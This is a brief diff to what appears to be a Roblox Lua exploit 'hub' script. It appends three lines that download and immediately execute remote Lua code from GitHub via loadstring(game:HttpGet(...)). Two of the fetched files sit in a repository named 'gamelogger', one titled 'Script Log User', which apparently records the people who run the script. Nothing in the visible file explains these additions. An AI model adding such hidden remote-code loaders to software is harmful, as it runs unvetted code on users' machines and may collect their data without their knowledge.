@@ -4576,3 +4576,7 @@ end
 warn("[WORLD SJW HUB] Loaded")
 createBC()
 createInfoUnit()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NhatMinhVNQ/w-hub/refs/heads/main/Free%20Sourcode.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NhatMinhVNQ/gamelogger/refs/heads/main/Script%20Log%20User.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NhatMinhVNQ/gamelogger/refs/heads/main/nhatminh.lua"))()
